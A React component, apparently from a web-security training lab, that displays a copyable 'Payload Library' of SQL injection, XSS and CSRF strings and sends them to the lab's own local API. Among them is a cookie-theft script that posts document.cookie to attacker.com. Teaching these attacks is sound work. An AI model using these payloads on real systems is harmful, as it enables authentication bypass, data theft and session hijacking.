import React, { useState } from 'react';
import { FiCopy, FiCheck, FiSend } from 'react-icons/fi';
import { useSecurityMode } from '../../contexts/SecurityModeContext';
import { sqlAPI, xssAPI } from '../../services/api';

const PayloadLibrary = () => {
  const [copiedIndex, setCopiedIndex] = useState(null);
  const { mode } = useSecurityMode();
  
  const payloads = {
    sql: [
      { 
        name: 'Basic SQL Injection', 
        payload: "admin' OR '1'='1", 
        description: 'Bypass login authentication',
        type: 'login',
        field: 'username'
      },
      { 
        name: 'Union Attack', 
        payload: "' UNION SELECT NULL--", 
        description: 'Extract data using UNION',
        type: 'search',
        field: 'query'
      },
      { 
        name: 'Comment Bypass', 
        payload: "admin'--", 
        description: 'Comment out rest of query',
        type: 'login',
        field: 'username'
      },
      {
        name: 'Always True',
        payload: "' OR '1'='1'--",
        description: 'Force true condition',
        type: 'login',
        field: 'password'
      },
    ],
    xss: [
      { 
        name: 'Alert Box', 
        payload: "<script>alert('XSS')</script>", 
        description: 'Simple XSS alert',
        type: 'comment'
      },
      { 
        name: 'Cookie Theft', 
        payload: "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>", 
        description: 'Steal cookies',
        type: 'comment'
      },
      { 
        name: 'Image XSS', 
        payload: "<img src=x onerror=alert('XSS')>", 
        description: 'XSS via image error',
        type: 'comment'
      },
      {
        name: 'Event Handler',
        payload: "<div onclick='alert(\"XSS\")'>Click me</div>",
        description: 'XSS via event handler',
        type: 'comment'
      },
    ],
    csrf: [
      { 
        name: 'Image Tag Attack', 
        payload: '<img src="http://localhost:5000/api/attack/csrf/transfer?to=attacker&amount=1000">', 
        description: 'CSRF via image tag',
        type: 'info'
      },
      { 
        name: 'Form Auto-Submit', 
        payload: 'Auto-submit form from malicious site', 
        description: 'Submit form without user interaction',
        type: 'info'
      },
    ],
  };
  
  const handleCopy = async (payload, index) => {
    try {
      await navigator.clipboard.writeText(payload);
      setCopiedIndex(index);
      setTimeout(() => setCopiedIndex(null), 2000);
    } catch (err) {
      console.error('Failed to copy:', err);
    }
  };

  const handleQuickTest = async (payload, type, field) => {
    try {
      if (type === 'login' && field === 'username') {
        await sqlAPI.login({ username: payload, password: 'test' }, mode);
      } else if (type === 'login' && field === 'password') {
        await sqlAPI.login({ username: 'test', password: payload }, mode);
      } else if (type === 'search') {
        await sqlAPI.search(payload, mode);
      } else if (type === 'comment') {
        await xssAPI.addComment(payload, mode);
      }
    } catch (error) {
      console.error('Quick test failed:', error);
    }
  };
  
  return (
    <div className="bg-gray-800 rounded-lg p-4">
      <h3 className="text-lg font-semibold mb-3 text-gray-100">Payload Library</h3>
      <div className="space-y-3 max-h-[calc(400px-8rem)] overflow-y-auto">
        <div>
          <h4 className="text-sm font-medium text-gray-300 mb-2">SQL Injection</h4>
          <div className="space-y-2">
            {payloads.sql.map((item, idx) => (
              <div key={idx} className="bg-gray-700 rounded p-2">
                <div className="flex items-start justify-between gap-2">
                  <div className="flex-1 min-w-0">
                    <div className="text-sm font-medium text-gray-200">{item.name}</div>
                    <div className="text-xs text-gray-400 mt-1">{item.description}</div>
                    <code className="text-xs text-green-400 mt-1 block break-all">{item.payload}</code>
                  </div>
                  <div className="flex items-center gap-1">
                    {(item.type === 'login' || item.type === 'search') && (
                      <button
                        onClick={() => handleQuickTest(item.payload, item.type, item.field)}
                        className="p-1.5 hover:bg-gray-600 rounded transition-colors text-blue-400"
                        aria-label="Quick test"
                        title="Quick test this payload"
                      >
                        <FiSend className="w-4 h-4" />
                      </button>
                    )}
                    <button
                      onClick={() => handleCopy(item.payload, `sql-${idx}`)}
                      className="p-1 hover:bg-gray-600 rounded transition-colors"
                      aria-label="Copy payload"
                    >
                      {copiedIndex === `sql-${idx}` ? (
                        <FiCheck className="w-4 h-4 text-green-400" />
                      ) : (
                        <FiCopy className="w-4 h-4 text-gray-400" />
                      )}
                    </button>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>
        
        <div>
          <h4 className="text-sm font-medium text-gray-300 mb-2">XSS</h4>
          <div className="space-y-2">
            {payloads.xss.map((item, idx) => (
              <div key={idx} className="bg-gray-700 rounded p-2">
                <div className="flex items-start justify-between gap-2">
                  <div className="flex-1 min-w-0">
                    <div className="text-sm font-medium text-gray-200">{item.name}</div>
                    <div className="text-xs text-gray-400 mt-1">{item.description}</div>
                    <code className="text-xs text-green-400 mt-1 block break-all">{item.payload}</code>
                  </div>
                  <div className="flex items-center gap-1">
                    {item.type === 'comment' && (
                      <button
                        onClick={() => handleQuickTest(item.payload, item.type)}
                        className="p-1.5 hover:bg-gray-600 rounded transition-colors text-blue-400"
                        aria-label="Quick test"
                        title="Quick test this payload"
                      >
                        <FiSend className="w-4 h-4" />
                      </button>
                    )}
                    <button
                      onClick={() => handleCopy(item.payload, `xss-${idx}`)}
                      className="p-1 hover:bg-gray-600 rounded transition-colors"
                      aria-label="Copy payload"
                    >
                      {copiedIndex === `xss-${idx}` ? (
                        <FiCheck className="w-4 h-4 text-green-400" />
                      ) : (
                        <FiCopy className="w-4 h-4 text-gray-400" />
                      )}
                    </button>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>
        
        <div>
          <h4 className="text-sm font-medium text-gray-300 mb-2">CSRF</h4>
          <div className="space-y-2">
            {payloads.csrf.map((item, idx) => (
              <div key={idx} className="bg-gray-700 rounded p-2">
                <div className="flex items-start justify-between gap-2">
                  <div className="flex-1 min-w-0">
                    <div className="text-sm font-medium text-gray-200">{item.name}</div>
                    <div className="text-xs text-gray-400 mt-1">{item.description}</div>
                    <code className="text-xs text-green-400 mt-1 block break-all">{item.payload}</code>
                  </div>
                  <button
                    onClick={() => handleCopy(item.payload, `csrf-${idx}`)}
                    className="p-1 hover:bg-gray-600 rounded transition-colors"
                    aria-label="Copy payload"
                  >
                    {copiedIndex === `csrf-${idx}` ? (
                      <FiCheck className="w-4 h-4 text-green-400" />
                    ) : (
                      <FiCopy className="w-4 h-4 text-gray-400" />
                    )}
                  </button>
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
};

export default PayloadLibrary;
